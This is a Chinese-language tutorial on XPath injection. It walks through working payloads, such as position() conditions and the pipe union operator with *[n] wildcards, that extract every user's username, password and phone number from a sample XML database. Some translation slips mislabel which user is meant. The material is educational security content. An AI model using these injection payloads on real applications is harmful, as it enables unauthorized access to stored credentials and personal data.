##基础知识XPATH注入

在本教程中，我们将讨论XPATH注入的基本知识，并学习注入XPATH查询的基础知识。XPATH查询也像SQL查询一样。注入XPATH的规则也与SQL查询相同。您必须注意用单引号或双引号关闭输入，然后根据需要进行注释。为了更好的理解，我将使用XML文件来解释本教程中的所有示例，您也可以使用[Leettime][Leettime]进行练习

[Leettime]:http://leettime.net/sqlninja.com/

```
<userdb>
	<user>
		<name first="Jeff" last="Smiley"/>
		<id>1</id>
		<username>Jefferson</username>
		<password>Jutobi</password>
		<phone>123-456-7890</phone>
	</user>
	<user>
		<name first="Chunk" last="MacRunfast"/>
		<id>2</id>
		<username>Alexandra</username>
		<password>securityidiots</password>
		<phone>603-478-4115</phone>
	</user>
	<user>
		<name first="Zenodermus" last="Javanicus"/>
		<id>3</id>
		<username>Zen</username>
		<password>@lltogether</password>
		<phone>222-222-2222</phone>
	</user>
</userdb>
```
我们不是直接从XPATH注入说起，而是通过一条我们熟知的SQL查询语句来告诉你如何简单地将SQL查询关联或转换为XPATH查询。以下是一个基本的SQL查询，我们使用id上的条件从数据库userdb下的表user中提取用户名。

`select username from userdb.user where id=1`

现在让我们将上述查询转换为XPATH查询并查看其差异。

`/userdb/user[id='1']/username`

正如你在上面的查询中看到的，我们首先指定了路径，然后指定了条件，然后指定了我们想要提取的内容，就这么简单。现在我希望你能理解基本的XPATH查询。因此，现在让我们注入上面的查询来逐一枚举每个用户的用户名，假设我们不知道每个用户的用户ID，并且我们想检查所有用户的用户名，那么我们可以使用position()函数。这是一个position函数的例子。

```
/userdb/user[position()=1]/username
将提取第一个用户名是"Jefferson"

/userdb/user[position()=2]/username
将提取第一个用户名是"Alaxandra"

/userdb/user[position()=3]/username
将提取第一个用户名是 "Zen"
```

现在让我们使用之前使用的查询并使用位置函数注入它。 

`/userdb/user[id='our_input_here']/username`

我们输入 ' or position()=1 or ' 将组合为如下语句

`/userdb/user[id='' or position()=1 or '']/username`

将提取第一个用户名是 "Jefferson"

这意味着条件id为空，我们将得到第一个用户名。但是这样的注入不允许我们列举其他细节，比如SQL中的其他列或XPATH中的其他列，也可以说其他的兄弟姐妹节点。原因是因为在查询结束时的'/username'使我们的查询只能提取用户名。 所以我们该如何查询其他兄弟姐妹节点，在这里，我们使用管道符为我们提供一个旁路以此来绕过查询限制，管道符也称为XPATH的联合选择操作符。一个管道操作符可以用来连接两个不同的语句，使用管道符我们可以将`/username`部分分隔到下一个语句中，并且不管第二个语句有任何输出，因为 XPATH会从第一个声明给我们输出。这意味着我们需要关注的只是保持我们的第一个语句有效。所以我们可以让我们的查询是这样的。

```
/userdb/user[id='our_input_here']/username
我们输入 ' or position()=1]/New_Element_name|a[' 查询将变成如下语句
/userdb/user[id='' or position()=1]/New_Element_name|a['']/username
```
现在，例如我们想要使用上面的注入提取用户的密码，然后我们只需要将密码列的名称放在元素的位置，这会给我们下面的结果：

`/userdb/user[id='ourinputhere']/username`

我们输入` ' or position()=1]/password|a['` 查询将变成下列语句

`/userdb/user[id='' or position()=1]/password|a['']/username`

将提取第一个用户的密码，即"Jutobi"

它会成功地给我们返回密码，但现在我们只是假设密码列名是password，这只是一个假设。但是如果密码的列名称是`'my_pass'`那么我们将无法提取它。
在这里，我们可以使用另一个技巧，如果仔细阅读选择未知节点，那么您可能知道我们可以做什么。我们可以使用通配符`*`来选择一个未知的节点或元素，并且我们必须指定我们想要的元素。请仔细看下面的例子： 

```
/userdb/user[id='ourinputhere']/username
我们输入 ' or position()=1]/*[1]|a[' 查询将变为下列语句
/userdb/user[id='' or position()=1]/*[1]|a['']/username
它不会提取任何东西，因为元素是属性而非元素值
/userdb/user[id='' or position()=1]/*[2]|a['']/username
它将获得第一个用户的第二个元素，即 '1'.
/userdb/user[id='' or position()=1]/*[3]|a['']/username
它将获得第一个用户的第三个元素，即"Jefferson".
/userdb/user[id='' or position()=1]/*[4]|a['']/username
它将获得第一个用户的第四个元素，即"Jutobi".
/userdb/user[id='' or position()=1]/*[5]|a['']/username
它将获得第一个用户的第五个元素，即 "123-456-7890".
```

 <font color=red>' or position()=2]/*[1]|a['</font>
 
查询中的红色部分是我们的注入的payload。以这种方式，我们可以枚举第一个元素的所有兄弟节点，现在让我们改变position()来枚举第二个用户的所有值。

```
/userdb/user[id='ourinputhere']/username
我们输入' or position()=2]/*[1]|a[' 查询会变成下列语句
/userdb/user[id='' or position()=2]/*[1]|a['']/username
它不会提取任何东西，因为元素是属性而非元素值
/userdb/user[id='' or position()=2]/*[2]|a['']/username
它将获得第一个用户的第二个元素'2'。
/userdb/user[id='' or position()=2]/*[3]|a['']/username
它将获得第一个用户的第三个元素，即"Alexandra".
/userdb/user[id='' or position()=2]/*[4]|a['']/username
它将获得第一个用户的第四个元素，即"securityidiots".
/userdb/user[id='' or position()=2]/*[5]|a['']/username
它将获得第一个用户的第五个元素，即 "603-478-4115".
```

以同样的方式，我们也可以提取第三个用户的详细信息。
